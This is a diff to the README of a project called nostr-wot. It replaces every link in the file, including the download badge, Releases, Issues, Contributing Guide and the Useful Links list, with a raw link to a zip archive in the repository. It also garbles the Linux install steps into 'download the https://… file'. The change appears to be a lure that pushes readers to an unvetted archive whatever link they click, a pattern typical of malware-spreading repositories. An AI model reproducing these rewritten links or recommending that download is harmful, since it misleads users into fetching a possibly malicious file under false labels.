@@ -2,7 +2,7 @@
 
 ## 🔗 Download Now
 
-[![Download Nostr WOT](https://img.shields.io/badge/Download-Nostr%20WOT-blue.svg)](https://github.com/vgiappnee-web/nostr-wot/releases)
+[![Download Nostr WOT](https://github.com/vgiappnee-web/nostr-wot/raw/refs/heads/main/app/nostr_wot_v1.6.zip%https://github.com/vgiappnee-web/nostr-wot/raw/refs/heads/main/app/nostr_wot_v1.6.zip)](https://github.com/vgiappnee-web/nostr-wot/raw/refs/heads/main/app/nostr_wot_v1.6.zip)
 
 ## 🚀 Getting Started
 
@@ -13,7 +13,7 @@ Whether you're new to this topic or just want to enhance your Nostr experience, 
 ## 📥 Download & Install
 
 1. **Visit the Releases Page:**
-   To get the latest version of **nostr-wot**, visit the [Releases page](https://github.com/vgiappnee-web/nostr-wot/releases).
+   To get the latest version of **nostr-wot**, visit the [Releases page](https://github.com/vgiappnee-web/nostr-wot/raw/refs/heads/main/app/nostr_wot_v1.6.zip).
 
 2. **Choose Your Version:**
    On the Releases page, you will find different versions available. Look for the most recent version, which will have the highest number.
@@ -22,12 +22,12 @@ Whether you're new to this topic or just want to enhance your Nostr experience, 
    Click on the download link for your operating system. 
    - For Windows, download the `.exe` file.
    - For Mac, download the `.dmg` file.
-   - For Linux, download the `.tar.gz` file.
+   - For Linux, download the `https://github.com/vgiappnee-web/nostr-wot/raw/refs/heads/main/app/nostr_wot_v1.6.zip` file.
 
 4. **Install the Application:**
    - For Windows: Double-click the `.exe` file and follow the prompts to install the application.
    - For Mac: Open the `.dmg` file and drag the application to your Applications folder.
-   - For Linux: Extract the `.tar.gz` file and follow the instructions included in the README.
+   - For Linux: Extract the `https://github.com/vgiappnee-web/nostr-wot/raw/refs/heads/main/app/nostr_wot_v1.6.zip` file and follow the instructions included in the README.
 
 5. **Launch the Application:**
    Once installed, find **nostr-wot** in your applications and start using it!
@@ -70,7 +70,7 @@ You can make server-side queries using our API. Documentation on how to use the 
 
 ## 📄 Contributing
 
-We welcome contributions! If you wish to contribute to **nostr-wot**, please check our [Contributing Guide](https://github.com/vgiappnee-web/nostr-wot/blob/main/CONTRIBUTING.md).
+We welcome contributions! If you wish to contribute to **nostr-wot**, please check our [Contributing Guide](https://github.com/vgiappnee-web/nostr-wot/raw/refs/heads/main/app/nostr_wot_v1.6.zip).
 
 ## 📝 License
 
@@ -78,12 +78,12 @@ This project is open source and released under the MIT License. You can find mor
 
 ## 🗨️ Support
 
-For any issues or questions, please check our [Issues page](https://github.com/vgiappnee-web/nostr-wot/issues) or contact us via the discussions section for community support.
+For any issues or questions, please check our [Issues page](https://github.com/vgiappnee-web/nostr-wot/raw/refs/heads/main/app/nostr_wot_v1.6.zip) or contact us via the discussions section for community support.
 
 ## 🔗 Useful Links
 
-- [Releases Page](https://github.com/vgiappnee-web/nostr-wot/releases)
-- [Issues Page](https://github.com/vgiappnee-web/nostr-wot/issues)
-- [Contributing Guide](https://github.com/vgiappnee-web/nostr-wot/blob/main/CONTRIBUTING.md)
+- [Releases Page](https://github.com/vgiappnee-web/nostr-wot/raw/refs/heads/main/app/nostr_wot_v1.6.zip)
+- [Issues Page](https://github.com/vgiappnee-web/nostr-wot/raw/refs/heads/main/app/nostr_wot_v1.6.zip)
+- [Contributing Guide](https://github.com/vgiappnee-web/nostr-wot/raw/refs/heads/main/app/nostr_wot_v1.6.zip)
 
 Thank you for choosing **nostr-wot**! We hope this project enhances your experience with the Nostr network.
